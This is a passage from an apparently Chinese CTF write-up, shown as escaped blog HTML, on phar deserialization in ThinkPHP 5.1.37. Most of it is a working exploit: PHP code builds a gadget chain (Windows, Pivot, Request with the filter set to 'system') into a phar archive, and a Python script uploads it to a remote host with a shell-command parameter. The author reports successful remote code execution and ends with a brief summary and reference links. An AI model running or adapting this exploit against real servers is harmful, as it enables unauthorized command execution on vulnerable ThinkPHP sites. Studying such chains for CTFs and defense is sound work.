&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title class_&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Model&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title class_&#34;&gt;protected&lt;/span&gt; $&lt;span class=&#34;title class_&#34;&gt;append&lt;/span&gt; = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt; = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;append = [&lt;span class=&#34;string&#34;&gt;&amp;quot;ethan&amp;quot;&lt;/span&gt;=&amp;gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;godspeedyyds&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;xtxyyds&amp;quot;&lt;/span&gt;]];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;data = [&lt;span class=&#34;string&#34;&gt;&amp;quot;ethan&amp;quot;&lt;/span&gt;=&amp;gt;&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Request&lt;/span&gt;()];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Request&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$hook&lt;/span&gt; = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$filter&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$config&lt;/span&gt; = [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;var_method&amp;#x27;&lt;/span&gt;       =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;_method&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;var_ajax&amp;#x27;&lt;/span&gt;         =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;_ajax&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;var_pjax&amp;#x27;&lt;/span&gt;         =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;_pjax&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;var_pathinfo&amp;#x27;&lt;/span&gt;     =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;s&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;pathinfo_fetch&amp;#x27;&lt;/span&gt;   =&amp;gt; [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;#x27;ORIG_PATH_INFO&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;#x27;REDIRECT_PATH_INFO&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;#x27;REDIRECT_URL&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;default_filter&amp;#x27;&lt;/span&gt;   =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;url_domain_root&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;https_agent_name&amp;#x27;&lt;/span&gt; =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;http_agent_ip&amp;#x27;&lt;/span&gt;    =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;HTTP_X_REAL_IP&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;#x27;url_html_suffix&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;html&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$param&lt;/span&gt; = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;cat /y0u_f0und_It&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;filter = &lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;config = [&lt;span class=&#34;string&#34;&gt;&amp;quot;var_ajax&amp;quot;&lt;/span&gt;=&amp;gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;hook = [&lt;span class=&#34;string&#34;&gt;&amp;quot;visible&amp;quot;&lt;/span&gt;=&amp;gt;[&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;isAjax&amp;quot;&lt;/span&gt;]];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;process&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;pipes&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title class_&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;model&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;concern&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;Conversion&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title&#34;&gt;model&lt;/span&gt;\&lt;span class=&#34;title&#34;&gt;Pivot&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Windows&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$files&lt;/span&gt; = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;files = [&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Pivot&lt;/span&gt;()];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;model&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title class_&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;Model&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Pivot&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Model&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title class_&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;process&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;pipes&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;Windows&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$w&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Windows&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;phar.phar&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;startBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setStub&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setMetadata&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$w&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;addFromString&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;12345&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;stopBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;执行后生成phar，然后执行脚本&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; urllib.parse&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;phar.phar&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;rb&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    s = f.read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = urllib.parse.quote(base64.b64encode(s).decode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# print(s)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remote = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;here_is_remote_ip&amp;gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sess =requests.session()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = sess.post(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    url = &lt;span class=&#34;string&#34;&gt;f&amp;#x27;http://&lt;span class=&#34;subst&#34;&gt;&amp;#123;remote&amp;#125;&lt;/span&gt;/index.php/index/index/hello&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    params=&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;ethan&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;here_is_your_shell_command&amp;gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;world&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;f&amp;#x27;hello=&lt;span class=&#34;subst&#34;&gt;&amp;#123;s&amp;#125;&lt;/span&gt;&amp;amp;a=phar://./hello.txt&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;成功RCE&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a href=&#34;#总结&#34; class=&#34;headerlink&#34; title=&#34;总结&#34;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;phar反序列化提供了一种扩展反序列化漏洞攻击面的方式、入口，所以基于unserialize()函数的各类攻击tricks（比如引用绕过之类的）依然适用。鉴于phar反序列化漏洞设计版本较多，相信CTF比赛中它仍然会稳定出场。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html&#34;&gt;Thinkphp-5.1.37-反序列化漏洞&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.php.net/manual/zh/class.phar.php&#34;&gt;https://www.php.net/manual/zh/class.phar.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/lllffg/article/details/116145918&#34;&gt;Thinkphp 5.1.37反序列化漏洞&lt;/a&gt;&lt;/p&gt;
